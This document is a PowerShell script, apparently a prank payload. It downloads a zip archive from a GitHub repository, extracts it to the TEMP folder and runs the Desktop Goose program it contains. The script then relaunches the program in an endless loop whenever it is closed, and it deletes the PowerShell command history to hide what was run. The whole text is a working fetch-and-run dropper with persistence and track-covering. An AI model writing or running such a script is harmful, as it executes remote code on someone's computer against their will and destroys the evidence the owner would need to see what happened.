$url = "https://github.com/Akeydeys/In/raw/main/Birth%20Goose.zip"

$destination = [System.IO.Path]::Combine($env:TEMP, "Birth-Goose.zip")

Invoke-WebRequest -Uri $url -OutFile $destination

$extractedFolder = [System.IO.Path]::Combine($env:TEMP, "Birth-Goose")
Expand-Archive -Path $destination -DestinationPath $extractedFolder

Remove-Item -Path $destination -Force

$gooseDesktopPath = Get-ChildItem -Path $extractedFolder -Recurse -Filter "GooseDesktop.exe" | Select-Object -First 1

Start-Sleep -Seconds 3

Start-Process -FilePath $gooseDesktopPath.FullName -ErrorAction SilentlyContinue

$historyRemoved = $false

while ($true) {
    if (-not (Get-Process -Name "GooseDesktop" -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath $gooseDesktopPath.FullName
        if (-not $historyRemoved) {
            Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
            $historyRemoved = $true
        }
    }
    Start-Sleep -Seconds 3
}
